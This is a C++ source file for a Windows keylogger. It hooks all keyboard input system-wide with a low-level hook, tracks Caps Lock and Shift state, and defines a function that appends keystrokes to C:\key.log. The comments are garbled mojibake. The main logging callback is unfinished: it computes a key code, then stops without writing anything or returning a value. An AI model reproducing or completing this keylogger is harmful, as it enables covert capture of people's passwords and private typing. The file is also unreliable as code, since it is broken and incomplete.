#include <Windows.h>
#include <Winuser.h>
#include <malloc.h> // ��� ������ � ������������ �������
#include <locale.h> // �����������
#include <string.h>
#include <stdio.h> // ��� ������ � ����

// ���������
#define SIZE_STR 1 << 8 //������ ������ ������� ������� 256 ���������
#define PATH L"C:\\key.log" //���� � �����
#define RUS 0x0419 // ����������� ��������� ����������
#define ENG 0x0409

BOOL IsCaps(void); // �������� ����� �� ���� ��� ����
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam); // �����������
VOID WriteToFile(LPWSTR wstr); // ������ � ����
LPWSTR Text(const wchar_t* str); // ���������� ���� ��� �����

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmd, int nCmdShow)
{
	// ����� ���, ���������� ����
	HHOOK hHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // ��������, ������� ��������� �� �� ��� �� ������ ��� �� ������� ����������
		LogKey, // ��������� �� ������� � ������� ����� ���������
		NULL, NULL // wParam and lParam
	);
	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);
	return 0;
}



LPWSTR Text(const wchar_t* str)
{
	return const_cast<LPWSTR>(str);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

BOOL IsCaps(void) // �������� ��������� �� �� � ������ ��������
{
	// VK - virtual key
	// GetKeyState - ��� ����������� ��������� ������� ������
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
	{
		return true;
	}
	return false;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam; // ��������� ��� �������� ���������� � ������ ��� ��������� ���� ������
		// �������� �� ������ � �������� �� 16 ���������
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16; // ��� ��������� ������� ������

	}
}